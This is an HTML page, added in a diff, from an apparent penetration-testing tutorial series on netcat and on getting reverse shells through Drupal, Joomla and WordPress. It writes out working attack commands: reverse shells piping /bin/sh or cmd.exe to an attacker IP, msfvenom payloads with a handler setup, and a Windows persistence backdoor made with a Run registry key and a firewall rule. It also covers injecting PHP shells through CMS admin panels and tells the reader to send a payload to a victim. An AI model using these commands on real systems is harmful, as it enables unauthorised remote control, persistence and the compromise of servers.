@@ -1,0 +1,464 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: scroll;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1020px;
+        position: fixed;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: fixed;
+        overflow-y: scroll;
+        padding-top: 0px;
+	float: center;
+    }
+
+
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 30px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">🌐【WordPress Penetration Testing】🖧</a>
+  <a href="2.html">🌐【PenTesting Lab Setup: Squid Proxy &  Burpsuite Payloads】🖧</a>
+  <a href="3.html">🌐【Beginner Guide to Google Dorks】🖧</a>
+  <a href="4.html">🌐【Introduction to Command Injection】🖧</a>
+ <a href="5.html">🌐【WebServer Shell-ing through PhpMyAdmin】🖧</a>
+  <a href="6.html">🌐【Comprehensive Guide on FFUF & HTTPX】🖧</a>
+  <a href="7.html">🌐【Comprehensive Guide on HTML & XXE Injection】🖧</a>
+<a href="8.html">🌐【NetCat for PenTesting & Web Framework Reverse Shell】🖧</a>
+  <a href="9.html">🌐【Web Shells Penetration Testing】🖧</a>
+  <a href="10.html">🌐【Database Penetration Testing】🖧</a>
+ <p align="center"><img src="https://pwa-audio-player.digitalskeleton.com.ng/p.jpg" height="90" width="200"></p>
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h3 class="heading-element" dir="auto" tabindex="-1"><p align="left">🌐NetCat for PenTesting & Web Framework Reverse Shell🖧</p></h3>
+<h3><strong>Contents</strong></h3>
+<ul>
+<li>Introduction</li>
+<li>Why Netcat?</li>
+<li>Netcat Basic command</li>
+<li>Port Scanning
+<ul>
+<li>TCP Scan</li>
+<li>UDP Scan</li>
+</ul>
+</li>
+<li>Chatting</li>
+<li>Banner Grabbing</li>
+<li>File transfer</li>
+<li>Linux Reverse Shell</li>
+<li>Randomized port</li>
+<li>Grabbing the HTTP Banner</li>
+<li>Windows Reverse Shell</li>
+<li>Windows 10 Persistence</li>
+<li>Msfvenom Payload with Netcat</li>
+</ul>
+<h3><strong>Introduction</strong></h3>
+<p>Netcat technically used as&nbsp;<strong>&ldquo;nc&rdquo;</strong>&nbsp;&ndash; is a network utility that uses the TCP and UDP connections in order to read and write in a network. It can be used by both the attackers and the security auditors.</p>
+<p>Counting in the attacking scenario, this cross-functional tool can be driven by scripts which makes it quite dependable and if we discuss the security section, it helps us to debug and investigate the network.</p>
+<p><em>Why netcat is such dependable, that it can do everything whether it is port scanning, banner grabbing, transferring a file, or even generating a reverse connection?</em></p>
+<p>Let&rsquo;s check out the major netcat features and unlock this question.</p>
+<ol>
+<li>It acts as a simple TCP/UDP/SCTP/SSL client for interacting with web servers, telnet servers, mail servers, and other TCP/IP network services.</li>
+<li>It redirects the TCP/UDP/SCTP traffic to other ports or hosts by acting as a SOCKS or HTTP proxy such that the clients specify their own destinations.</li>
+<li>Netcat can even connect to destinations through a chain of anonymous or authenticated proxies.</li>
+<li>Encrypts communication with SSL, and transport it over IPv4 or IPv6.</li>
+<li>It acts as a connection broker, allowing two (or far more) clients to connect to each other through a third (brokering) server.</li>
+</ol>
+<p>So uptill now, you might be aware of all the features that Netcat has, which makes it unique and simple.</p>
+<p>Let&rsquo;s try to dig deeper and explore what we can more do with this great tool.</p>
+<p><strong>Netcat basic command</strong></p>
+<p><strong>&ldquo;Help&rdquo;</strong>&nbsp;or sometimes its&nbsp;<strong>&ldquo;h&rdquo;</strong>, this flag drops out every possible option that a tool can do for us. To start with netcat, we&rsquo;ll be using the most basic help command i.e. :</p>
+<pre class="lang:default decode:true">nc -h</pre>
+<p><img src="https://1.bp.blogspot.com/-HiipCCUiV00/Xw4RyNgXwYI/AAAAAAAAl1Y/WNLhyHqZegcM0Hj2jVZ6GFB0SIlG8r0VACLcBGAsYHQ/s1600/1.png" alt="" /></p>
+<h3><strong>Port Scanning</strong></h3>
+<p>Netcat can be used as a port scanner, although it was not designed to function as. To make it worth as a scanner, we need to set the&nbsp;<strong>&ldquo;-z&rdquo;&nbsp;</strong>flag, which tells netcat, to scan listing daemon without sending any data. This makes it possible to understand the type of service that is running on that specific port. Thus netcat can perform both the TCP and the UDP scan, let&rsquo;s check it out how:</p>
+<p><strong>TCP Scan</strong></p>
+<pre class="lang:default decode:true">nc -v -n -z 192.168.1.105 21-100</pre>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>[-v]:&nbsp;</strong>indicates Verbose mode</p>
+<p><strong>&nbsp;&nbsp;&nbsp; [-n]:</strong>&nbsp;indicates numeric-only IP addresses</p>
+<p><strong>&nbsp;&nbsp;&nbsp; [-z]:</strong>&nbsp;indicates zero -I/O mode [used for scanning]</p>
+<p>In order to complete this scan, we need to&nbsp;<strong>specify a range of ports.</strong>&nbsp;From the below image you can see that I&rsquo;ve mentioned a port range of&nbsp;<strong>21-100,&nbsp;</strong>which will dump the running services over the target&rsquo;s machine.</p>
+<p><img src="https://1.bp.blogspot.com/-pb11L7tKrmE/Xw4R17ULAWI/AAAAAAAAl1c/TOgDS8tAQ4YL6stPhogHAXfnOVxp2ooPgCLcBGAsYHQ/s1600/2.png" alt="" /></p>
+<p><strong>UDP Scan</strong></p>
+<p>We can even scan the UDP ports in a similar way we scanned the TCP ones. Here we&rsquo;ll be using the&nbsp;<strong>&ldquo;&ndash;u&rdquo;</strong>&nbsp;flag which will invoke the UDP mode.</p>
+<pre class="lang:default decode:true">nc -vzu 192.168.1.105 161</pre>
+<p>In this scenario, we have mentioned the port number rather than the range. From the below image you can see that we&rsquo;ve captured the running&nbsp;<strong>&ldquo;snmp&rdquo;&nbsp;</strong>service.</p>
+<p><img src="https://1.bp.blogspot.com/-YRjfnhq1i9A/Xw4R4-9aqGI/AAAAAAAAl1g/QKlMi0AU2xsxTqYGeFI2KSA6hurtD6CYwCLcBGAsYHQ/s1600/3.png" alt="" /></p>
+<h3><strong>Chatting</strong></h3>
+<p>Netcat can also be used to chat between two users. But before that, we need to establish a connection. To set up this all, we&rsquo;ll be using two devices &ndash; one will play the role as&nbsp;<strong>an initiator</strong>&nbsp;and the other one will be&nbsp;<strong>a listener</strong>. As soon as this connection is established, the communication can be done from both ends.</p>
+<p>Let&rsquo;s check out this scenario, where two users with different operating systems communicate with each other over a Netcat established connection.</p>
+<p>Initially,&nbsp;<strong>kali&rsquo;s root user</strong>&nbsp;needs to set up his netcat&nbsp;<strong>&ldquo;listener&rdquo;</strong>&nbsp;over a specific port, to build up a network connection. Run the following command to do so:</p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p>here,</p>
+<p><strong>[l]:</strong>&nbsp;Listen Mode</p>
+<p><strong>[v]:&nbsp;</strong>Verbose Mode</p>
+<p><strong>[p]:</strong>&nbsp;Local Port</p>
+<p>Now it&rsquo;s time to setup an&nbsp;<strong>initiator</strong>, we&rsquo;ll be doing this from the&nbsp;<strong>Ubuntu&rsquo;s root user,</strong>&nbsp;by simply providing the IP Address of the system where we have started the&nbsp;<strong>listener&nbsp;</strong>followed by the port number.</p>
+<pre class="lang:default decode:true">nc 192.168.1.109 1234</pre>
+<p><img src="https://1.bp.blogspot.com/-U2Ya4LR67f8/Xw4R8iY8g2I/AAAAAAAAl1k/6BX-OSqPjAQcC0MNA4hJoIQe7h8EiqDXACLcBGAsYHQ/s1600/4.png" alt="" /></p>
+<p>From the below image you can see that the&nbsp;<strong><em>connection has been setup</em></strong>&nbsp;and both the machines are now able to communicate with each other.</p>
+<p><img src="https://1.bp.blogspot.com/-yEs-XmnSBis/Xw4R_tvpk5I/AAAAAAAAl1o/D1reoDh29ocVi5vxSfljl7H_XS9EJg1GACLcBGAsYHQ/s1600/5.png" alt="" /></p>
+<h3><strong>Banner Grabbing</strong></h3>
+<p>Banner refers to a text message received from the host with information about the open ports and services along with their version numbers.</p>
+<p>Run the following command to grab the target&rsquo;s&nbsp;<strong>ftp&nbsp;</strong>and<strong>&nbsp;ssh banners</strong>:</p>
+<pre class="lang:default decode:true">nc 192.168.1.105 21
+nc 192.168.1.105 22</pre>
+<p><img src="https://1.bp.blogspot.com/-dmnGbj_9iHU/Xw4SCnOEWXI/AAAAAAAAl1s/O8rTfVeUX_4sVTU0tKfy_CFALAQjUmQ5ACLcBGAsYHQ/s1600/6.png" alt="" /></p>
+<h3><strong>File Transfer</strong></h3>
+<p>Netcat offers us an opportunity to transfer files from one device to another over a network.</p>
+<p>Let&rsquo;s follow up with a scenario, where a&nbsp;<strong>kali user&nbsp;</strong>exempts to transfer his files to a user at an&nbsp;<strong>Ubuntu machine</strong>.</p>
+<p>From the below image the user over the&nbsp;<strong>kali machine&nbsp;</strong>sets up a&nbsp;<strong>listener&nbsp;</strong>at port number&nbsp;<strong>5555,&nbsp;</strong>and shares file.txt using the&nbsp;<strong>&ldquo;&lt;&rdquo;&nbsp;</strong>parameter.</p>
+<pre class="lang:default decode:true">nc -lvp 5555 &lt; file.txt</pre>
+<p><img src="https://1.bp.blogspot.com/-q9S_ZwSUtTA/Xw4SG32OenI/AAAAAAAAl1w/26Bqv44mvLI0k7e_MgSBay3c1LmoKqSNgCLcBGAsYHQ/s1600/7.png" alt="" /></p>
+<p>Now the user sitting at the&nbsp;<strong>Ubuntu server&nbsp;</strong>will download this file by running the following command.</p>
+<pre class="lang:default decode:true">nc 192.168.1.109 5555 &gt; file.txt</pre>
+<p>From the below image you can see that the&nbsp;<strong>Ubuntu user</strong>&nbsp;has successfully grabbed the&nbsp;<strong>file.txt&nbsp;</strong>&nbsp;file from&nbsp;<strong>192.168.1.109</strong>&nbsp;which is nothing but the&nbsp;<strong>kali user&rsquo;s IP</strong></p>
+<p><strong><img src="https://1.bp.blogspot.com/-Cm7QJ1SoxmI/Xw4SJ8xr-dI/AAAAAAAAl10/SO-lwelAY3cdMqoFq5QPMZM1MM5Nw5-2QCLcBGAsYHQ/s1600/8.png" alt="" /></strong></p>
+<h3><strong>Linux Reverse Shell</strong></h3>
+<p>As discussed earlier netcat can perform anything, so now we&rsquo;ll try to exploit the target&rsquo;s machine with the help of&nbsp;<strong>&ldquo;msfvenom&rdquo;</strong>&nbsp;to create a payload and will setup a&nbsp;<strong>netcat listener</strong>&nbsp;to grab a session.</p>
+<p>Let&rsquo;s try to create a payload using the following command:</p>
+<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.109 lport=6666 R</pre>
+<p>The&nbsp;<strong>&ldquo;R&rdquo;&nbsp;</strong>flag is used to generate a&nbsp;<strong>raw payload</strong>&nbsp;which will be over our screen.</p>
+<p><img src="https://1.bp.blogspot.com/-eI7v-ZsPu48/Xw4SM8PxiYI/AAAAAAAAl18/vOF99csUNSIJysNgBWIQChiZe49Ivas3ACLcBGAsYHQ/s1600/9.png" alt="" /></p>
+<p>From the above image, you can see that our payload is ready, now its time to trigger it over our victim&rsquo;s server.</p>
+<p>Open the Ubuntu machine and type this payload in the terminal.&nbsp;<strong>Before firing it up</strong>, get back to the attacker&rsquo;s machine(kali Linux) and setup the&nbsp;<strong>netcat listener</strong>&nbsp;over there by using the same port number that you used while generating the payload.</p>
+<p><img src="https://1.bp.blogspot.com/-LfDv0LdFWz0/Xw4SQlmTn0I/AAAAAAAAl2A/izC4aNEZ2wg_YK5vdDERnSlAy3F_UEICgCLcBGAsYHQ/s1600/10.png" alt="" /></p>
+<p>From the below image you can see that, as soon as the victim runs the payload, we&rsquo;ll get the session.</p>
+<p><img src="https://1.bp.blogspot.com/-ChEcDWa8UEE/Xw4ST6hChJI/AAAAAAAAl2M/aDKR5XjeZcIgsiXFx3LW2_ccOyQ6AhWzgCLcBGAsYHQ/s1600/11.png" alt="" /></p>
+<p>There are many times when the&nbsp;<strong>security gets high</strong>&nbsp;and we fail to grab the session using this method, but there is another way to get a reverse shell.</p>
+<p>Before that, setup a netcat&nbsp;<strong>listener</strong>&nbsp;at port<strong>&nbsp;443</strong>:</p>
+<p>As the listener boots in, just execute the following commands in the target&rsquo;s machine :</p>
+<pre class="lang:default decode:true">mknod /tmp/backpipe p</pre>
+<p>&nbsp;</p>
+<pre class="lang:default decode:true">/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.109 443 1&gt;/tmp/backpipe</pre>
+<p>This will help you to bypass the security and offer you a netcat session.</p>
+<p><img src="https://1.bp.blogspot.com/-8SfTDyg7Xp4/Xw4SXlaZ3aI/AAAAAAAAl2U/BgLH0zNd3LAHmX7cn23NpAyG_8X-hm77wCLcBGAsYHQ/s1600/12.png" alt="" /></p>
+<p>From the below image you can see that we&rsquo;ve successfully captured the victim&rsquo;s shell.</p>
+<p><img src="https://1.bp.blogspot.com/-EKsaDXthoeI/Xw4Sak5UtGI/AAAAAAAAl2Y/wOk_MchhNgIWC7xusRh2AnfJJnKFcKkxgCLcBGAsYHQ/s1600/13.png" alt="" /></p>
+<h3><strong>Randomized Port</strong></h3>
+<p>There are chances when we aren&rsquo;t able to decide the very own port to set up a listener or to establish a netcat connection. Well, netcat has a special&nbsp;<strong>&ldquo;&ndash;r&rdquo;</strong>&nbsp;flag which will provide us randomized local port.</p>
+<pre class="lang:default decode:true">nc -lv &ndash;r</pre>
+<p>From the below image you can see that our listener has been started at&nbsp;<strong>38931.</strong></p>
+<p><img src="https://1.bp.blogspot.com/-jqnEpFuw4c0/Xw4SefNNJ8I/AAAAAAAAl2c/90oQ1nb7XUgJD_x556HFC6TH3gUt62qHACLcBGAsYHQ/s1600/14.png" alt="" /></p>
+<h3><strong>Grabbing the HTTP Banner</strong></h3>
+<p>HTTP banners are now can&rsquo;t be fetched easily, as they contain the server&rsquo;s information. But we can use netcat to capture information about any webserver.</p>
+<p>Simply run the following command in order to manipulate the&nbsp;<strong>target&rsquo;s server</strong>&nbsp;and check what we have grabbed.</p>
+<pre class="lang:default decode:true">printf "GET / HTTP/1.0\r\n\r\n" | nc 192.168.1.105 80</pre>
+<p>Great!! From the below image you can see that I&rsquo;ve successfully captured the HTTP banner and we are presented with the&nbsp;<strong>Apache server.</strong></p>
+<p><img src="https://1.bp.blogspot.com/-I9R8G-GyAWE/Xw4Sh7IXQtI/AAAAAAAAl2g/cBjmazJZBG0R77v6d78WswENfFW3u66sACLcBGAsYHQ/s1600/15.png" alt="" /></p>
+<h3><strong>Windows Reverse Connection</strong></h3>
+<p>A system&rsquo;s backdoor welcomes us every time with open hands whenever we knockback.</p>
+<p>Thus we&rsquo;ll try to generate such a similar backdoor over the target&rsquo;s windows machine, which allows us to get in, at any time when we come back.</p>
+<p>Let&rsquo;s setup a&nbsp;<strong>listener</strong>&nbsp;over our kali machine first:</p>
+<pre class="lang:default decode:true">nc -lvp 4444</pre>
+<p>Now execute the following command over the victim&rsquo;s&nbsp;<strong>windows command prompt&nbsp;</strong>to create a backdoor<strong>.</strong></p>
+<pre class="lang:default decode:true">nc.exe 192.168.1.109 4444 -e cmd.exe</pre>
+<p><img src="https://1.bp.blogspot.com/-5e2gQDhEQFI/Xw4SlkjpzCI/AAAAAAAAl2o/B86S3Mjpt4oF3Qlt1UU4lHmKNw_nCWBrACLcBGAsYHQ/s1600/16.png" alt="" /></p>
+<p>Time to get back to our&nbsp;<strong>attacker&rsquo;s machine</strong>. From the below image you can see that we are into the victim&rsquo;s command shell.</p>
+<p><img src="https://1.bp.blogspot.com/-ABqwhinfo-k/Xw4SonDGJTI/AAAAAAAAl2w/SkTsyr_z7n0eYrFCnNQxPE3Gwict2_cdACLcBGAsYHQ/s1600/17.png" alt="" /></p>
+<h3><strong>Windows 10 Persistence</strong></h3>
+<p>Persistence plays a major role in an attacker&rsquo;s life. So let&rsquo;s try to create a&nbsp;<strong>persistent backdoor</strong>&nbsp;using netcat and Metasploit framework, on the host machine which we have compromised.</p>
+<p>From the below image you can see that I&rsquo;ve grabbed a&nbsp;<strong>meterpreter session</strong>&nbsp;of a&nbsp;<strong>Windows 10</strong>&nbsp;machine.</p>
+<p>Now upload&nbsp;<strong>netcat.exe</strong>&nbsp;file into&nbsp;<strong>system32</strong>&nbsp;in the victim&rsquo;s pc by using the following command:</p>
+<pre class="lang:default decode:true">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</pre>
+<p><img src="https://1.bp.blogspot.com/-5FojMj3JNyw/Xw4SsetgMHI/AAAAAAAAl20/xKDGry1AKj02O-Kyrl8vMv1Oaq7KAK5QQCLcBGAsYHQ/s1600/18.png" alt="" /></p>
+<p>Now set up netcat to a&nbsp;<strong>listener</strong>&nbsp;at any random port say&nbsp;<strong>4445</strong>, open the port on startup and make the connection.</p>
+<p>Use the following command:</p>
+<pre class="lang:default decode:true">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe'</pre>
+<p><img src="https://1.bp.blogspot.com/-VGvw_n5pENo/Xw4SwmUsfoI/AAAAAAAAl24/UfjJIRSrzCo6agH093W6qhxwLFTrf-YvwCLcBGAsYHQ/s1600/19.png" alt="" /></p>
+<p>On a successful netcat connection, we will get the reverse_shell of the victim&rsquo;s PC.</p>
+<p>Now its time to add up a new rule to firewall named as&nbsp;<strong>&lsquo;netcat&rsquo;</strong>&nbsp;in which the&nbsp;<strong>inbound connection</strong>&nbsp;will allow for&nbsp;<strong>port 4445</strong>&nbsp;by using the interactive cmd prompt running a command called&nbsp;<strong>netsh</strong>.</p>
+<p>Type the following command:</p>
+<pre class="lang:default decode:true">netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445</pre>
+<p>Let&rsquo;s check out the operational mode and the port status by running up the following command:</p>
+<pre class="lang:default decode:true">netsh firewall show portopening</pre>
+<p><img src="https://1.bp.blogspot.com/-sfptWxrx4Hw/Xw4Szxbd5GI/AAAAAAAAl3A/8ELnPREvuTgAzodzi-kV725aDzGpjJzBwCLcBGAsYHQ/s1600/20.png" alt="" /></p>
+<p>So with all that, we are done. Now when the victim&nbsp;<strong>reboots the system</strong>&nbsp;again, we will get the netcat shell. Run the following command to connect our&nbsp;<strong>netcat backdoor</strong>&nbsp;via port&nbsp;<strong>4445</strong>.</p>
+<pre class="lang:default decode:true">nc -nv 192.168.1.105 4445</pre>
+<p>Great!! We&rsquo;ve successfully maintained the&nbsp;<strong>permanent</strong>&nbsp;<strong>backdoor</strong>, now whenever the victim boots in we&rsquo;ll always have its session. To learn more about Windows persistence click&nbsp;here.</p>
+<p><img src="https://1.bp.blogspot.com/-jbtIOCz_0Tc/Xw4S3JQ8hYI/AAAAAAAAl3E/pamaiMvDbcw0c1HR_zB-9-91_wNMBIs8QCLcBGAsYHQ/s1600/21.png" alt="" /></p>
+<h3><strong>Msfvenom Payload with Netcat</strong></h3>
+<p>Until now we&rsquo;ve learned everything about Netcat, from its basic things to its advanced ones. So let&rsquo;s learn how we can connect with the victim through our Netcat_shell using a msfvenom payload.</p>
+<p>Fire up the terminal and run the following command to generate a&nbsp;<strong>.exe</strong>&nbsp;payload</p>
+<pre class="lang:default decode:true">msfvenom -p windows/shell_reverse_tcp&nbsp;lhost=192.168.1.104 lport=3333 &ndash;f exe &gt; shell.exe</pre>
+<p><img src="https://1.bp.blogspot.com/-rt2-OFHdTxQ/Xw4S6geJvsI/AAAAAAAAl3I/1Z3a6TZJ_hAUsQ3tnlTkOGpnwdkg7sQOgCLcBGAsYHQ/s1600/22.png" alt="" /></p>
+<p>Now&nbsp;<strong>turn on</strong>&nbsp;the Netcat&nbsp;<strong>listener&nbsp;</strong>over port&nbsp;<strong>3333.</strong></p>
+<p>Share this generated payload with the victim, as soon as he/she opens it up you&rsquo;ll get the&nbsp;<strong>reverse connection.</strong></p>
+<p><strong><img src="https://1.bp.blogspot.com/-7YEeKzBc6Ek/Xw4S9_qqBUI/AAAAAAAAl3Q/-jOdbi1sfGAjXgxlK41CB74p-idRHss2wCLcBGAsYHQ/s1600/23.png" alt="" /></strong></p>
+<h1 class="post-title entry-title">Drupal: Reverseshell</h1>
+<p>In this guide, you will learn how to test security loopholes in Drupal CMS for any critical vulnerability which can cause great damage to any website if found on any webserver.&nbsp; In this guide, you will learn how a misconfigured web application can be easily exploited.</p>
+<p><strong>Remote Code Execution:</strong>&nbsp;Remote Code Evaluation is a vulnerability that occurs because of the unsafe handling of inputs by the server application or that can be exploited if user input is injected into a File or a String and executed by the programming language&rsquo;s parser or the user input is not sanitised properly in POST request and also when accepting query string param during GET requests.</p>
+<p>Therefore a Remote Code Evaluation can lead to a full compromise of the vulnerable web application and also a web server.</p>
+<p><strong>Let&rsquo;s Begin!!</strong></p>
+<p>So the drupal is accessible through a web browser by exploring the following URL:</p>
+<pre class="lang:default decode:true">http://192.168.10.117/drupal</pre>
+<p>And this opens the default home page, to access the dashboard you must-have credential for login.</p>
+<p><img src="https://1.bp.blogspot.com/-p5WuniFLZ98/Xbp6GlLhnSI/AAAAAAAAhJw/NeO8IxfR7WUy7IXwW8kw0o5g0ZufIaAqgCLcBGAsYHQ/s1600/11.png" alt="" /></p>
+<p>So, to access the user console, I used following creds.</p>
+<pre class="lang:default decode:true">Username:raj
+Password:123</pre>
+<p><img src="https://1.bp.blogspot.com/-p9XU3rDXnQc/Xbp6GrGQ0BI/AAAAAAAAhJo/40MclehkX40DVqesGckZZkLbVOv2XidZgCLcBGAsYHQ/s1600/12.png" alt="" /></p>
+<p>After accessing the admin console, it was time to exploit web application by injecting malicious content inside it. Directly writing malicious scripts as web content will not give us the reverse shell of the application but after spending some time, we concluded that it requires PHP module. We, therefore, move to install new module through&nbsp;<strong><em>Manage&gt;Extend&gt;List&gt;Install new module</em></strong>.</p>
+<p>You can download the PHP package for Drupal from the URL below and upload the tar file to install the new module.</p>
+<p>https://www.drupal.org/project/php</p>
+<p><img src="https://1.bp.blogspot.com/-hHb-Sia2f8w/Xbp6Gg_vY8I/AAAAAAAAhJs/GIyZiNhdna4Ip5wzDdfGuqacLzeBMfTtQCLcBGAsYHQ/s1600/13.5.png" alt="" /></p>
+<p>To install php module upload the tar file that was downloaded.</p>
+<p><img src="https://1.bp.blogspot.com/-Z_JMFIlSLAE/Xbp6HvdEViI/AAAAAAAAhJ0/Nl1GPB4TfRwin3QU91jyJnnNarOFfD2rgCLcBGAsYHQ/s1600/13.png" alt="" /></p>
+<p>So, when the installation is completed, we need to enable to the added module.</p>
+<p><img src="https://1.bp.blogspot.com/-Nu5Pg87KRg4/Xbp6HwQOjaI/AAAAAAAAhJ8/EZr9I0DFVQYfgB3Iq-kuMuUAGcfk8kRtwCLcBGAsYHQ/s1600/14.png" alt="" /></p>
+<p>Again, move to&nbsp;<strong>Manage &gt; Extend &gt;filters</strong>&nbsp;and enable the checkbox for PHP filters.</p>
+<p><img src="https://1.bp.blogspot.com/-hBglmPhyUOM/Xbp6H3oM2PI/AAAAAAAAhJ4/GzbJ3DhZNHMCEys-vRL1WVnByRXPytYcgCLcBGAsYHQ/s1600/15.png" alt="" /></p>
+<p>Now use the Pentest monkey PHP script, i.e. &ldquo;reverse shell backdoor.php&rdquo; to be injected as basic content. Don&rsquo;t forget to add a &ldquo;listening IP &amp; port&rdquo; to get a reversed connection. Continue to change the &ldquo;text format to PHP&rdquo; and enable the publishing checkbox. Keep the netcat listener ON in order to receive the incoming shell.</p>
+<p>When everything is set accordingly, click the preview button and you&rsquo;ll get the reverse connection over the netcat.</p>
+<p><img src="https://1.bp.blogspot.com/-0mJStJQMszg/Xbp6IlNJFHI/AAAAAAAAhKE/BgbfiPgrgOsTmkY5vu77DBp7Mc6RKWceQCLcBGAsYHQ/s1600/16.png" alt="" /></p>
+<p>Hence, we got the reverse connection of the host machine.</p>
+<p><img src="https://1.bp.blogspot.com/-f_JQLIcho5w/Xbp6IXXR7dI/AAAAAAAAhKA/FiKGZXSZVesIjz3vvA5spHuWxVVVYiD9ACLcBGAsYHQ/s1600/18.png" alt="" /></p>
+<h1 class="post-title entry-title">Joomla: Reverse Shell</h1>
+<p>Joomla is one of the popular Content Management System (CMS) which helps you to build your website. Joomla has gained its popularity by being user-friendly as its complication-free when during installation; and it is also pretty reliable. In this guide, we learn how to get a reverse shell of Joomla.</p>
+<p>As you can see in the image below, the website is made in Joomla. Now, that we have our Joomla environment we start exploiting it.&nbsp;</p>
+<p><img src="https://1.bp.blogspot.com/-kFYnSXVFvW4/XbhytR0HSQI/AAAAAAAAhHM/ZFun5TCVmS4dzxFg-ozNawhkDhCXTbT5ACLcBGAsYHQ/s1600/1.png" alt="" /></p>
+<p>The attack that we are going to show is categorised under post-exploitation; which means one should have login credentials of Joomla. The URL of the login page of Joomla will be consisted of &lsquo;joomla/administrator&rsquo; and here, enter username and password as shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-6umI-JWZE9M/Xbhys7tf32I/AAAAAAAAhHI/uSPRNBEnG2krL4iqU9hU40NFQ4C_IeaTwCLcBGAsYHQ/s1600/2.png" alt="" /></p>
+<p>Once you are logged in, go to extensions. A drop-down menu will appear, from this menu select templates; just like it has been shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-ivTpSjYQ_ts/XbhyuF5215I/AAAAAAAAhHQ/nluZvOXQFC4S3nF1F99ciTA9t46ksRoggCLcBGAsYHQ/s1600/3.png" alt="" /></p>
+<p>Implementing the above will show you the list of templates present in the website and so we will exploit one of them i.e. Beez3 details and files. &nbsp;</p>
+<p><img src="https://1.bp.blogspot.com/-EiyVCaIk9TA/XbhyueifHFI/AAAAAAAAhHU/dTiGQ73dYlwdy4E5jVUXRFi3BVFYtNUwgCLcBGAsYHQ/s1600/4.png" alt="" /></p>
+<p>Once, you are in the template, go to index.php as shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-8t_C9g7WwIE/XbhyuViZrTI/AAAAAAAAhHY/3v6UyRDMRN0gadbnFc9rTADqX8feLt2oACLcBGAsYHQ/s1600/5.png" alt="" /></p>
+<p>This way you will able to edit index.php in the template as you can see in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-5or2amsT7Mg/XbhyvK4qO1I/AAAAAAAAhHc/EesrAnhDa9UJW89rNfqZ_fK78vMUEt84ACLcBGAsYHQ/s1600/6.png" alt="" /></p>
+<p>Now, swap the code of index.php with the reverse shellcode i.e. found in Kali Linux and add your IP and port in the code just like it has been shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-jIjLpkMU3oE/Xbhyva9IR2I/AAAAAAAAhHg/eibg_vUUqkk8BJomiURNysps9wZEv6tPACLcBGAsYHQ/s1600/7.png" alt="" /></p>
+<p>Now, activate netcat to get a session with the following command :</p>
+<pre class="lang:default decode:true">nc -lvp 1234</pre>
+<p><img src="https://1.bp.blogspot.com/-cooH80pCEz8/XbhyvhJMHmI/AAAAAAAAhHk/S1t3dFtcWEweh6TS2W-RumxpNe63B-94wCLcBGAsYHQ/s1600/8.png" alt="" /></p>
+<p>Another way to get a reverse shell is by msfvenom, and for this type the following command :</p>
+<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost =192.168.0.9 lport=1234 R</pre>
+<p><img src="https://1.bp.blogspot.com/-wKmFKhjxmQ4/XbhywOcLLvI/AAAAAAAAhHo/BAiKdbBUhMsajvDKV9_FR5WfIp85UKRAgCLcBGAsYHQ/s1600/9.png" alt="" /></p>
+<p>The above command will give you the malicious php code. Swap this code just like before&nbsp; and simultaneously start the multi/handler as shown in the image below :</p>
+<pre class="lang:default decode:true">use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.0.9
+set lport 1234
+exploit</pre>
+<p><img src="https://1.bp.blogspot.com/-OvSq7FWQ9VM/Xbhys2uBpRI/AAAAAAAAhHE/yvE-s5rD4cMC32FT5jmr6WzP7MeztVnGgCLcBGAsYHQ/s1600/10.png" alt="" /></p>
+<p>These were the two ways to get a reverse shell in Joomla.</p>
+<h1 class="post-title entry-title">WordPress: Reverse Shell</h1>
+<h3>Content</h3>
+<ul>
+<li>Metasploit Framework</li>
+<li>Injecting Malicious code</li>
+<li>Inject Malicious Plugin</li>
+<li>Inject custom Malicious Plugin</li>
+<li>WetW0rk &ndash; Malicious WordPress Plugin</li>
+</ul>
+<p>Requirement:</p>
+<p>Host machine: WordPress</p>
+<p>Attacker machine: Kali Linux</p>
+<p>WordPress Credential: raj: 123 (in our case)</p>
+<p><strong>Let&rsquo;s begin!!</strong></p>
+<p>As you can see, I have access to the WordPress admin console via the web browser. To obtain a web shell, we need to exploit this CMS. There are multiple methods to exploit WordPress; let&rsquo;s explore some of these operations.</p>
+<p><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjWT1Tl4jNWU4iF3nnUilJBHN_p-bX2u-j6ck7twX5IHCPvGYs0xeebHrYRRb5tECKHQpfgAxj6rqZKLZVQbuL8sz_LUaQBJp6pvhHEjn0_-I_XPCTjoqTbfg3d17pCiEx4xIX_tCpdGkyZM4ALXyscC13EMJZDLA16pytpwsknfXGxBmpvGqsCd0d1Rzh9/s16000/1.png" alt="" /></p>
+<h3>Metasploit Framework</h3>
